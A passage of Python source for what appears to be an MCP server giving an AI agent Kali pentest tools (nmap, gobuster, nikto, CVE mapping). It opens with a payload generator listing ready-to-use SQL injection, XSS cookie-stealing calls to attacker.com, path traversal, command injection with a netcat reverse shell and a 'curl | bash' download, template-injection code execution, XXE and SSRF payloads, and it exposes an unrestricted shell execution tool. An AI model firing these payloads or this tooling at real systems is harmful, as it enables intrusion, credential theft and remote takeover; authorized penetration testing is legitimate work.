            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        ]
        mssql_specific = [
            "'; EXEC sp_configure 'show advanced options',1--",
            "'; EXEC xp_cmdshell 'dir'--",
            "' UNION SELECT name FROM master..sysdatabases--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ]
        postgres_specific = [
            "'; SELECT pg_sleep(5)--",
            "' UNION SELECT version()--",
            "' UNION SELECT current_database()--",
            "' UNION SELECT usename FROM pg_user--",
            "'; COPY (SELECT '') TO PROGRAM 'id'--",
        ]
        if db_type == "mysql": return generic + mysql_specific
        elif db_type == "mssql": return generic + mssql_specific
        elif db_type == "postgres": return generic + postgres_specific
        return generic
    
    @staticmethod
    def xss_payloads() -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert('XSS')",
            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>script>alert('XSS')<</script>/script>",
            "<svg/onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            # DOM-based
            "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>",
            "<svg><animate onbegin=alert('XSS') attributeName=x>",
            # Polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleport//{{.teleport}}/>",
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        return [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\\\....\\\\....\\\\etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
            "/etc/passwd%00", "/etc/passwd%00.jpg",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://whoami",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            # Windows
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\win.ini",
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[str]:
        return [
            "; whoami", "| whoami", "|| whoami", "&& whoami", "& whoami",
            "`whoami`", "$(whoami)",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; id", "| id", "; uname -a", "| uname -a",
            "; ls -la", "| ls -la",
            "; nc -e /bin/sh attacker.com 4444",
            "; curl http://attacker.com/shell.sh | bash",
            # Blind injection
            "; sleep 5", "| sleep 5", "&& sleep 5",
            "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
            # Bypass attempts
            ";${IFS}whoami", ";\twhoami", "%0awhoami",
            "$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
        ]
    
    @staticmethod
    def ssti_payloads() -> List[str]:
        return [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "{{config}}", "{{self.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.items()}}", "{{request.environ}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            # Jinja2 specific
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
        ]
    
    @staticmethod
    def xxe_payloads() -> List[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
        ]

    @staticmethod
    def ssrf_payloads() -> List[str]:
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1/", "http://0.0.0.0/",
            "http://[::1]/", "file:///etc/passwd",
            "gopher://127.0.0.1:25/", "dict://127.0.0.1:6379/info",
        ]

    @staticmethod
    def auth_bypass_payloads() -> List[str]:
        return [
            "admin' --", "admin'/*", "' OR 1=1--",
            "admin", "password", "admin:admin",
            "' OR ''='", "') OR ('1'='1",
        ]

    @staticmethod
    def get_payloads(category: str = "all") -> Dict[str, List[str]]:
        """Get payloads by category or all."""
        all_payloads = {
            "sqli": PayloadGenerator.sql_injection_payloads(),
            "xss": PayloadGenerator.xss_payloads(),
            "lfi": PayloadGenerator.lfi_payloads(),
            "rce": PayloadGenerator.command_injection_payloads(),
            "ssti": PayloadGenerator.ssti_payloads(),
            "xxe": PayloadGenerator.xxe_payloads(),
            "ssrf": PayloadGenerator.ssrf_payloads(),
            "auth_bypass": PayloadGenerator.auth_bypass_payloads(),
        }
        if category == "all":
            return all_payloads
        return {category: all_payloads.get(category, [])}


# ============================================================================
# FASTMCP SERVER INITIALIZATION
# ============================================================================

mcp = FastMCP("Kali MCP Server v4 - Professional Pentest & Bug Bounty Platform")

# Decorator for session reference resolution
def resolve_references(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        resolved_kwargs = {}
        for key, value in kwargs.items():
            if isinstance(value, str) and value.startswith("@session:"):
                try:
                    resolved_kwargs[key] = resolve_session_reference(value)
                except Exception as e:
                    logger.warning(f"Could not resolve reference '{value}': {e}")
                    resolved_kwargs[key] = value
            else:
                resolved_kwargs[key] = value
        return await func(*args, **resolved_kwargs)
    return wrapper

def resolve_session_reference(reference: str) -> Any:
    """Resolve session reference to actual value"""
    if not reference.startswith("@session:"):
        return reference
    parts = reference.split(":")
    if len(parts) != 3:
        raise ValueError(f"Invalid reference format: {reference}")
    _, tool_name, output_key = parts
    
    # Look in chain engine first
    for key, entry in chain_engine.results_store.items():
        if entry["tool"] == tool_name:
            result = entry["result"]
            keys = output_key.split(".")
            value = result
            for k in keys:
                if isinstance(value, dict) and k in value:
                    value = value[k]
                elif isinstance(value, list) and k.isdigit():
                    value = value[int(k)]
                else:
                    raise ValueError(f"Key '{output_key}' not found in {tool_name} result")
            return value
    
    raise ValueError(f"No stored result for tool '{tool_name}'")

# Helper: create trace+progress context for a tool
def _init_tool_context(tool_name: str, target: str, total_steps: int = 5):
    """Initialize trace logger and progress reporter for a tool execution"""
    exec_id = generate_execution_id()
    exec_dir = session_mgr.get_execution_dir(target, tool_name, exec_id)
    trace = TraceLogger(exec_dir, tool_name)
    progress = ProgressReporter(tool_name, total_steps, trace)
    trace.info("init", f"Starting {tool_name} on target: {target}")
    return trace, progress, exec_dir


# ============================================================================
# CORE SESSION & MANAGEMENT TOOLS
# ============================================================================

@mcp.tool()
async def start_session(session_name: Optional[str] = None) -> str:
    """Start a new pentest session for organized result storage.
    All subsequent tool results will be stored under this session."""
    session_id = session_mgr.start_session(session_name)
    result = {
        "status": "success",
        "session_id": session_id,
        "session_dir": os.path.join(SESSIONS_DIR, session_id),
        "message": f"Session '{session_id}' started. All logs stored per-session/per-target.",
        "storage_structure": "sessions/{session_id}/{target}/{tool}/{execution_id}/"
    }
    return json.dumps(result, indent=2)

@mcp.tool()
async def server_health() -> str:
    """Check server status, available tools, session info, and chain state"""
    tools = [
        "nmap", "gobuster", "dirb", "nikto", "sqlmap", "msfconsole",
        "hydra", "john", "hashcat", "wpscan", "enum4linux", "amass",
        "dnsrecon", "theharvester", "whatweb", "wfuzz", "ffuf",
        "nuclei", "subfinder", "httpx", "curl", "wget", "vulnx"
    ]
    tool_status = {}
    for tool in tools:
        result = run_command_advanced(["which", tool], timeout=5)
        tool_status[tool] = {
            "available": result["success"],
            "path": result["stdout"] if result["success"] else None
        }
    
    available = [t for t, s in tool_status.items() if s["available"]]
    missing = [t for t, s in tool_status.items() if not s["available"]]
    
    result = {
        "status": "success",
        "version": "v4.0 - Professional Pentest & Bug Bounty Platform",
        "architecture": {
            "session_manager": "hierarchical per-session/per-target logging",
            "trace_logger": "forensic-level execution tracing",
            "progress_reporter": "real-time progress feedback",
            "tool_chain_engine": "cross-referencing & auto-enrichment",
            "cve_cartographer": "service-to-CVE mapping with patches",
            "input_validator": "security-hardened input sanitization"
        },
        "available_tools": available,
        "missing_tools": missing,
        "total_available": len(available),
        "total_missing": len(missing),
        "session_active": session_mgr.current_session_id is not None,
        "current_session": session_mgr.current_session_id,
        "chain_store_entries": len(chain_engine.results_store)
    }
    return json.dumps(result, indent=2)

@mcp.tool()
@resolve_references
async def execute_command(
    command: str,
    timeout: int = 600,
    working_dir: Optional[str] = None
) -> str:
    """Execute a shell command with full tracing and security validation.
    WARNING: Commands are logged with forensic trace for audit."""
    target = "localhost"
    trace, progress, exec_dir = _init_tool_context("execute_command", target, 3)
    
    inputs = {"command": command, "timeout": timeout, "working_dir": working_dir}
    
    progress.update("Validating command", command[:80])
    timeout = InputValidator.validate_timeout(timeout)
    
    progress.update("Executing command")
    result = run_command_advanced(command, timeout=timeout, cwd=working_dir, shell=True, trace=trace)
    
    output = {
        "status": "success" if result["success"] else "error",
        "command": command,
        "stdout": result["stdout"],
        "stderr": result["stderr"],
        "return_code": result["return_code"],
        "execution_time": result["execution_time"]
    }
    
    progress.update("Logging results")
    log_tool_execution("execute_command", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

@mcp.tool()
async def get_chain_summary(target: str) -> str:
    """Get cross-reference summary for a target - shows all tools run and their relationships"""
    summary = chain_engine.get_chain_summary(target)
    summary["status"] = "success"
    return json.dumps(summary, indent=2)

@mcp.tool()
async def session_summary() -> str:
    """Get current session summary with all targets and tools executed"""
    session_id = session_mgr.get_session_id()
    targets = session_mgr.list_session_targets()
    result = {
        "status": "success",
        "session_id": session_id,
        "targets": {t: {"tool_runs": len(runs), "tools": [r["tool"] for r in runs]} for t, runs in targets.items()},
        "total_targets": len(targets),
        "total_executions": sum(len(runs) for runs in targets.values()),
        "chain_entries": len(chain_engine.results_store)
    }
    return json.dumps(result, indent=2)


# ============================================================================
# NETWORK RECONNAISSANCE TOOLS (DEEPENED)
# ============================================================================

@mcp.tool()
@resolve_references
async def nmap_scan(
    target: str, scan_type: str = "comprehensive", ports: Optional[str] = None,
    scripts: Optional[str] = None, intensity: str = "medium",
    output_file: Optional[str] = None, additional_args: str = "",
    timeout: int = 900, auto_cve_map: bool = True
) -> str:
    """Advanced Nmap scanning with CVE auto-mapping and chain enrichment.
    Scan types: quick, basic, comprehensive, stealth, vuln, udp, aggressive.
    Set auto_cve_map=True to automatically map discovered services to CVEs."""
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("nmap_scan", target, 8)
    inputs = {"target": target, "scan_type": scan_type, "ports": ports,
              "scripts": scripts, "intensity": intensity, "timeout": timeout, "auto_cve_map": auto_cve_map}

    scan_profiles = {
        "quick": ["-F", "-T4", "--open"],
        "basic": ["-sV", "-sC", "-T3"],
        "comprehensive": ["-sV", "-sC", "-O", "-A", "--version-all"],
        "stealth": ["-sS", "-T2", "-f", "--data-length", "50"],
        "vuln": ["-sV", "--script=vuln,exploit,auth", "-T3"],
        "udp": ["-sU", "-sV", "--top-ports", "100", "-T4"],
        "aggressive": ["-sS", "-sV", "-sC", "-O", "-A", "-T4", "--script=default,vuln"]
    }
    intensity_timing = {"stealth": "-T1", "low": "-T2", "medium": "-T3", "high": "-T4", "aggressive": "-T5"}

    if scan_type not in scan_profiles:
        return json.dumps({"status": "error", "message": f"Invalid scan_type. Choose from: {list(scan_profiles.keys())}"})

    progress.update("Preparing scan", f"Type: {scan_type}, Target: {target}")

    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(exec_dir, "artifacts", f"nmap_{sanitize_filename(target)}_{timestamp}.xml")

    cmd = ["nmap"] + scan_profiles[scan_type]
    if intensity in intensity_timing and "-T" not in str(scan_profiles[scan_type]):
        cmd.append(intensity_timing[intensity])
    if ports:
        cmd.extend(["-p", ports])
    elif scan_type == "comprehensive":
        cmd.extend(["-p-"])
    if scripts:
        cmd.extend(["--script", scripts])
    cmd.extend(["-oX", output_file, "-oN", output_file.replace(".xml", ".txt")])
    if additional_args:
        cmd.extend(shlex.split(additional_args))
    cmd.append(target)

    progress.update("Executing nmap scan", f"Command: {' '.join(cmd[:6])}...")
    trace.info("scan_config", "Nmap configuration", {"profile": scan_type, "ports": ports, "scripts": scripts})
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing XML results")
    parsed_data = {"hosts": [], "ports": [], "services": [], "os_matches": [], "scripts": []}

    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            root = ET.fromstring(content)
            for host in root.findall("host"):
                host_info = {"addresses": [], "hostnames": [], "ports": [], "os": [], "status": "unknown"}
                status = host.find("status")
                if status is not None:
                    host_info["status"] = status.get("state", "unknown")
                for addr in host.findall("address"):
                    host_info["addresses"].append({"addr": addr.get("addr"), "type": addr.get("addrtype")})
                for hostname in host.findall("hostnames/hostname"):
                    host_info["hostnames"].append(hostname.get("name"))
                for port in host.findall("ports/port"):
                    port_info = {
                        "port": port.get("portid"), "protocol": port.get("protocol"),
                        "state": "unknown", "service": "unknown",
                        "product": None, "version": None, "extrainfo": None, "scripts": []
                    }
                    state = port.find("state")
                    if state is not None:
                        port_info["state"] = state.get("state")
                    service = port.find("service")
                    if service is not None:
                        port_info["service"] = service.get("name", "unknown")
                        port_info["product"] = service.get("product")
                        port_info["version"] = service.get("version")
                        port_info["extrainfo"] = service.get("extrainfo")
                    for script in port.findall("script"):
                        script_data = {"id": script.get("id"), "output": script.get("output", "")[:500]}
                        port_info["scripts"].append(script_data)
                        parsed_data["scripts"].append(script_data)
                    host_info["ports"].append(port_info)
                    if port_info["state"] == "open":
                        parsed_data["ports"].append(f"{port_info['port']}/{port_info['protocol']}")
                        parsed_data["services"].append({
                            "port": port_info["port"], "service": port_info["service"],
                            "product": port_info["product"], "version": port_info["version"]
                        })
                for osmatch in host.findall("os/osmatch"):
                    os_info = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")}
                    host_info["os"].append(os_info)
                    parsed_data["os_matches"].append(os_info)
                parsed_data["hosts"].append(host_info)
            trace.info("parse_complete", f"Parsed {len(parsed_data['hosts'])} hosts, {len(parsed_data['services'])} services")
        except ET.ParseError as e:
            trace.error("parse_error", f"Failed to parse Nmap XML: {e}")

    progress.update("Analyzing findings")
    open_ports = [p for h in parsed_data["hosts"] for p in h["ports"] if p["state"] == "open"]

    # Advanced analysis: fingerprint correlation
    fingerprint_analysis = []
    for svc in parsed_data["services"]:
        product = svc.get("product", "")
        version = svc.get("version", "")
        if product:
            risk = "low"
            if any(kw in (product or "").lower() for kw in ["apache", "nginx", "iis", "tomcat"]):
                risk = "medium" if version else "info"
            if any(kw in (product or "").lower() for kw in ["ftp", "telnet", "smb"]):
                risk = "high"
            fingerprint_analysis.append({
                "port": svc["port"], "product": product, "version": version,
                "risk_level": risk, "note": f"{product} {version or 'unknown version'} detected"
            })

    progress.update("CVE cartography")
    cve_map = {}
    if auto_cve_map and parsed_data["services"]:
        cve_map = CVECartographer.map_services_to_cves(parsed_data["services"])
        trace.info("cve_mapping", f"Mapped {cve_map.get('total_cves', 0)} CVEs across {len(parsed_data['services'])} services")

    progress.update("Building enriched output")
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target, "scan_type": scan_type, "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "hosts_up": len([h for h in parsed_data["hosts"] if h["status"] == "up"]),
            "open_ports": len(open_ports),
            "services_detected": len(parsed_data["services"]),
            "scripts_run": len(parsed_data["scripts"]),
            "cves_mapped": cve_map.get("total_cves", 0) if cve_map else 0
        },
        "open_ports": parsed_data["ports"],
        "services": parsed_data["services"],
        "fingerprint_analysis": fingerprint_analysis,
        "os_detection": parsed_data["os_matches"],
        "hosts": parsed_data["hosts"],
        "nse_scripts": parsed_data["scripts"][:30],
        "cve_cartography": cve_map if cve_map else None,
        "raw_output": result["stdout"][:3000] if result["stdout"] else "",
        "errors": result["stderr"] if result["stderr"] else None
    }

    progress.update("Enriching with chain context")
    output = chain_engine.enrich_with_context("nmap_scan", target, output)

    log_tool_execution("nmap_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# CVE CARTOGRAPHY TOOL
# ============================================================================

@mcp.tool()
async def cve_cartography(
    target: str,
    services: Optional[str] = None,
    use_online_lookup: bool = False
) -> str:
    """Map discovered services to CVEs with severity scores and recommended patches.
    If services is not provided, automatically pulls from previous nmap_scan results via chain engine.
    Services format: JSON array of {port, service, product, version}"""
    trace, progress, exec_dir = _init_tool_context("cve_cartography", target, 4)
    inputs = {"target": target, "services": services, "use_online": use_online_lookup}

    progress.update("Gathering service data")
    service_list = []
    if services:
        try:
            service_list = json.loads(services)
        except json.JSONDecodeError:
            trace.warn("parse", "Could not parse services JSON, trying chain engine")

    if not service_list:
        # Auto-pull from nmap chain
        nmap_result = chain_engine.get_result("nmap_scan", target)
        if nmap_result:
            service_list = nmap_result.get("services", [])
            trace.info("chain_pull", f"Pulled {len(service_list)} services from nmap_scan chain")
        else:
            trace.warn("no_data", "No nmap data found in chain. Run nmap_scan first or provide services JSON.")

    progress.update("Mapping CVEs")
    cartography = CVECartographer.map_services_to_cves(service_list, use_online=use_online_lookup)

    progress.update("Generating recommendations")
    recommendations = []
    for device in cartography.get("devices", []):
        if device["cve_count"] > 0:
            recommendations.append({
                "port": device["port"],
                "service": f"{device['product']} {device['version']}",
                "severity": device["max_severity"],
                "cve_count": device["cve_count"],
                "action": device["patches_recommended"][0] if device["patches_recommended"] else "Investigate and patch",
                "all_patches": device["patches_recommended"]
            })

    output = {
        "status": "success",
        "target": target,
        "total_services_scanned": len(service_list),
        "cartography": cartography,
        "priority_recommendations": sorted(recommendations,
            key=lambda r: {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}.get(r["severity"], 0),
            reverse=True),
        "risk_summary": {
            "critical_cves": cartography["critical_count"],
            "high_cves": cartography["high_count"],
            "medium_cves": cartography["medium_count"],
            "total_cves": cartography["total_cves"]
        }
    }

    progress.update("Complete")
    log_tool_execution("cve_cartography", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# VULNX INTEGRATION
# ============================================================================

@mcp.tool()
async def vulnx_scan(
    target: str,
    scan_cms: bool = True,
    scan_ports: bool = True,
    scan_dns: bool = True,
    timeout: int = 300
) -> str:
    """VulnX-style vulnerability scanner - CMS detection, subdomain enum, port scan,
    and vulnerability cross-referencing with CVE database.
    Combines multiple techniques for deep target profiling."""
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("vulnx_scan", target, 7)
    inputs = {"target": target, "scan_cms": scan_cms, "scan_ports": scan_ports, "scan_dns": scan_dns}

    result_data = {
        "target": target, "cms_detected": None, "cms_version": None,
        "vulnerabilities": [], "subdomains": [], "ports": [],
        "technologies": [], "dns_info": {}
    }

    # 1. Try actual vulnx if available
    progress.update("Checking vulnx availability")
    vulnx_check = run_command_advanced(["which", "vulnx"], timeout=5, trace=trace)

    if vulnx_check["success"]:
        progress.update("Running vulnx scan")
        vulnx_cmd = ["vulnx", "-u", target, "--dns", "--sub", "-j"]
        vx_result = run_command_advanced(vulnx_cmd, timeout=timeout, trace=trace)
        if vx_result["success"] and vx_result["stdout"]:
            try:
                vx_data = json.loads(vx_result["stdout"])
                result_data.update(vx_data)
            except json.JSONDecodeError:
                trace.warn("vulnx_parse", "Could not parse vulnx JSON output")
    else:
        trace.info("vulnx_fallback", "vulnx not found, using integrated analysis")

    # 2. CMS Detection (enhanced - works even without vulnx)
    if scan_cms:
        progress.update("CMS fingerprinting")
        url = target if target.startswith("http") else f"https://{target}"
        fetch = run_command_advanced(["curl", "-skL", "--max-time", "15", url], timeout=20, trace=trace)
        if fetch["success"] and fetch["stdout"]:
            html = fetch["stdout"].lower()
            cms_signatures = {
                "wordpress": ["wp-content", "wp-includes", "wp-json", "wordpress"],
                "joomla": ["joomla", "/media/jui/", "com_content"],
                "drupal": ["drupal", "sites/default/files", "drupal.settings"],
                "magento": ["magento", "mage/", "skin/frontend"],
                "shopify": ["shopify", "cdn.shopify.com"],
                "wix": ["wix.com", "wixsite.com"],
                "laravel": ["laravel", "csrf-token"],
                "django": ["csrfmiddlewaretoken", "django"],
                "flask": ["werkzeug", "flask"],
                "express": ["x-powered-by: express"],
                "strapi": ["strapi"],
                "ghost": ["ghost", "ghost-api"]
            }
            for cms, sigs in cms_signatures.items():
                if any(sig in html for sig in sigs):
                    result_data["cms_detected"] = cms
                    result_data["technologies"].append(f"CMS: {cms}")
                    trace.info("cms_found", f"CMS detected: {cms}")
                    break

            # Extract meta generator
            gen_match = re.search(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\'](.*?)["\']', html)
            if gen_match:
                result_data["cms_version"] = gen_match.group(1)
                result_data["technologies"].append(f"Generator: {gen_match.group(1)}")

            # Technology detection from headers
            hdr_fetch = run_command_advanced(["curl", "-skI", "--max-time", "10", url], timeout=15, trace=trace)
            if hdr_fetch["success"]:
                headers_text = hdr_fetch["stdout"]
                for line in headers_text.split('\n'):
                    if ':' in line:
                        k, v = line.split(':', 1)
                        k, v = k.strip().lower(), v.strip()
                        if k == "server":
                            result_data["technologies"].append(f"Server: {v}")
                        elif k == "x-powered-by":
                            result_data["technologies"].append(f"Framework: {v}")

    # 3. Port scan (quick)
    if scan_ports:
        progress.update("Quick port scan")
        port_cmd = run_command_advanced(
            ["nmap", "-F", "-T4", "--open", "-oG", "-", target],
            timeout=60, trace=trace
        )
        if port_cmd["success"]:
            for line in port_cmd["stdout"].split('\n'):
                ports_match = re.findall(r'(\d+)/open/(\w+)//([^/]*)', line)
                for port, proto, service in ports_match:
                    result_data["ports"].append({"port": port, "protocol": proto, "service": service})

    # 4. DNS info
    if scan_dns:
        progress.update("DNS reconnaissance")
        for rtype in ["A", "MX", "NS", "TXT"]:
            dns_cmd = run_command_advanced(["dig", "+short", rtype, target], timeout=10, trace=trace)
            if dns_cmd["success"] and dns_cmd["stdout"]:
                result_data["dns_info"][rtype] = [r.strip() for r in dns_cmd["stdout"].split('\n') if r.strip()]

    # 5. CVE correlation
    progress.update("CVE correlation")
    if result_data["cms_detected"]:
        cms_cves = CVECartographer.lookup_cves(result_data["cms_detected"], result_data.get("cms_version", "") or "")
        result_data["vulnerabilities"].extend(cms_cves)

    for svc in result_data.get("ports", []):
        svc_cves = CVECartographer.lookup_cves(svc.get("service", ""), "")
        result_data["vulnerabilities"].extend(svc_cves)

    # Deduplicate CVEs
    seen = set()
    unique_vulns = []
    for v in result_data["vulnerabilities"]:
        if v.get("cve") not in seen:
            seen.add(v.get("cve"))
            unique_vulns.append(v)
    result_data["vulnerabilities"] = unique_vulns

    output = {
        "status": "success",
        "target": target,
        **result_data,
        "summary": {
            "cms": result_data["cms_detected"],
            "technologies_found": len(result_data["technologies"]),
            "ports_open": len(result_data["ports"]),
            "vulnerabilities_found": len(result_data["vulnerabilities"]),
            "critical_vulns": sum(1 for v in result_data["vulnerabilities"] if v.get("severity") == "critical")
        }
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("vulnx_scan", target, output)
    log_tool_execution("vulnx_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)



# ============================================================================
# WEB APPLICATION SCANNING (DEEPENED)
# ============================================================================

@mcp.tool()
@resolve_references
async def gobuster_scan(
    url: str, mode: str = "dir", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt,js,json,xml,bak,old,asp,aspx",
    threads: int = 20, status_codes: str = "200,204,301,302,307,401,403",
    output_file: Optional[str] = None, additional_args: str = "", timeout: int = 600
) -> str:
    """Advanced directory/DNS/vhost enumeration with Gobuster. Modes: dir, dns, vhost, fuzz"""
    target = url
    trace, progress, exec_dir = _init_tool_context("gobuster_scan", target, 5)
    inputs = {"url": url, "mode": mode, "wordlist": wordlist, "extensions": extensions, "threads": threads}
    
    if not output_file:
        output_file = os.path.join(exec_dir, "artifacts", f"gobuster_{mode}_{sanitize_filename(url)}_{generate_timestamp()}.txt")
    
    progress.update("Building command")
    cmd = ["gobuster", mode]
    if mode == "dir":
        cmd.extend(["-u", url, "-w", wordlist])
        if extensions: cmd.extend(["-x", extensions])
        cmd.extend(["-s", status_codes, "--no-error", "-q"])
    elif mode == "dns":
        cmd.extend(["-d", url, "-w", wordlist])
    elif mode == "vhost":
        cmd.extend(["-u", url, "-w", wordlist])
    elif mode == "fuzz":
        cmd.extend(["-u", url, "-w", wordlist])
    cmd.extend(["-t", str(threads), "-o", output_file, "--timeout", "10s", "--delay", "50ms"])
    if additional_args: cmd.extend(shlex.split(additional_args))
    
    progress.update("Executing gobuster scan")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
    
    progress.update("Parsing results")
    findings = []
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('='):
                        match = re.search(r'(/\S+)\s+\(Status:\s*(\d+)\)', line)
                        if match:
                            findings.append({"path": match.group(1), "status": int(match.group(2)), "raw": line})
                        elif line.startswith('/') or 'http' in line.lower():
                            findings.append({"path": line, "raw": line})
        except Exception as e:
            trace.error("parse", f"Error parsing gobuster output: {e}")
    
    interesting = [f for f in findings if f.get("status") in [200, 301, 302]]
    auth_required = [f for f in findings if f.get("status") in [401, 403]]
    
    progress.update("Analyzing findings")
    # Deep analysis: categorize by risk
    high_risk_patterns = [".bak", ".old", ".sql", ".dump", ".env", ".git", "admin", "config", "backup"]
    high_risk = [f for f in findings if any(p in f.get("path", "").lower() for p in high_risk_patterns)]
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": url, "mode": mode, "wordlist": wordlist, "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {"total_found": len(findings), "interesting": len(interesting),
                     "auth_required": len(auth_required), "high_risk": len(high_risk)},
        "findings": findings[:100],
        "interesting_paths": [f["path"] for f in interesting],
        "auth_required_paths": [f["path"] for f in auth_required],
        "high_risk_paths": [{"path": f["path"], "reason": "Sensitive file/directory pattern"} for f in high_risk],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    progress.update("Complete")
    output = chain_engine.enrich_with_context("gobuster_scan", target, output)
    log_tool_execution("gobuster_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def nikto_scan(
    target: str, tuning: str = "x6", plugins: Optional[str] = None,
    output_file: Optional[str] = None, ssl: bool = False, timeout: int = 900
) -> str:
    """Web server vulnerability scanning with Nikto. Tuning: 0-9,a-c,x (see docs)"""
    trace, progress, exec_dir = _init_tool_context("nikto_scan", target, 5)
    inputs = {"target": target, "tuning": tuning, "plugins": plugins, "ssl": ssl}
    
    if not output_file:
        output_file = os.path.join(exec_dir, "artifacts", f"nikto_{sanitize_filename(target)}_{generate_timestamp()}.xml")
    
    progress.update("Configuring Nikto scan")
    cmd = ["nikto", "-h", target, "-Format", "xml", "-o", output_file]
    if tuning: cmd.extend(["-Tuning", tuning])
    if plugins: cmd.extend(["-Plugins", plugins])
    if ssl or target.startswith("https"): cmd.append("-ssl")
    cmd.extend(["-timeout", "10", "-maxtime", str(timeout - 60)])
    
    progress.update("Executing Nikto scan")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
    
    progress.update("Parsing vulnerabilities")
    vulnerabilities = []
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            root = ET.fromstring(content)
            for item in root.findall(".//item"):
                vuln = {"id": item.get("id"), "osvdb": item.get("osvdb"), "method": item.get("method"),
                        "uri": None, "description": None, "references": []}
                uri = item.find("uri")
                if uri is not None: vuln["uri"] = uri.text
                desc = item.find("description")
                if desc is not None: vuln["description"] = desc.text
                for ref in item.findall("references/reference"):
                    vuln["references"].append(ref.text)
                vulnerabilities.append(vuln)
        except ET.ParseError as e:
            trace.error("parse", f"Failed to parse Nikto XML: {e}")
    
    progress.update("Categorizing severity")
    critical = [v for v in vulnerabilities if any(k in str(v.get("description", "")).lower() for k in ["rce", "command execution", "sql injection", "remote code"])]
